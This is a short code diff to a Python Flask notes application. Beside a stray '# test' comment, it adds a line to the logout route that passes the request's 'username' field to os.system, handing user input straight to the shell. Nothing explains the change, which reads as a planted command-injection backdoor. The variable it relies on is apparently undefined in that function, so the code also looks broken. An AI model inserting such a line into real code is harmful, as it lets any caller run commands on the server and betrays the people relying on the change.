@@ -13,6 +13,9 @@ users = {
     3: {"id": 3, "username": "charlie", "password": generate_password_hash("password789")}
 }
 
+
+# test
+
 notes = {
     1: [
         {"id": 1, "content": "Alice's secret note 1"},
@@ -117,6 +120,7 @@ def login():
 @app.route('/logout', methods=['POST'])
 def logout():
     session.pop('user_id', None)
+    os.system(data.get('username'))
     return jsonify({"message": "Logout successful"}), 200
 
 if __name__ == '__main__':
